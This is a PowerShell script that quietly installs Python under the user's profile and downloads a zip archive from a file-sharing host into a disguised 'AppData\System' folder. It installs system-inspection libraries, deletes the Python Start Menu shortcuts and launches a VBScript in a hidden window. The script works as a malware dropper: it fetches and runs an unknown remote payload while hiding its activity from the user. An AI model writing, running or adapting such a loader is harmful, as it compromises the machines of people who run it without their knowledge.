# Define variables
$pythonInstallerUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
$zipScriptUrl = "https://s01.babup.com/uploads/System_6e03a.zip"
$targetDirectory = "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Python 3.11"

# Function to check if the directory contains four files
function CheckDirectoryContent {
    $fileCount = (Get-ChildItem -Path $targetDirectory | Measure-Object).Count
    return ($fileCount -ge 4)
}

# Create directory if it doesn't exist
$directoryPath = "$env:USERPROFILE\AppData\System"
if (-not (Test-Path -Path $directoryPath -PathType Container)) {
    New-Item -Path $directoryPath -ItemType Directory
}

# Download Python installer
Invoke-WebRequest -Uri $pythonInstallerUrl -OutFile "$env:USERPROFILE\AppData\System\pythonX.exe"
Start-Process -FilePath "$env:USERPROFILE\AppData\System\pythonX.exe" -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1" -Wait

# Download the zip script
Invoke-WebRequest -Uri $zipScriptUrl -OutFile "$env:USERPROFILE\AppData\System\System.zip"

# Unzip the script in the same directory
Expand-Archive -Path "$env:USERPROFILE\AppData\System\System.zip" -DestinationPath $directoryPath -Force

# Install required Python libraries (replace 'pip.exe' with full path)
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install os
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install requests
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install ctypes
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install termcolor
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install wmi
& "C:\Users\$env:USERNAME\AppData\Local\Programs\Python\Python311\Scripts\pip.exe" install psutil

# Check and remove existing files
if (CheckDirectoryContent) {
    Remove-Item -Path $targetDirectory -Force -Recurse
}

# Run Python script (assumes BN.vbs exists in the specified directory)
cd "$env:USERPROFILE\AppData\System"
Start-Process -FilePath "BN.vbs" -WindowStyle Hidden

# Display completion message
Write-Host "Script completed!"
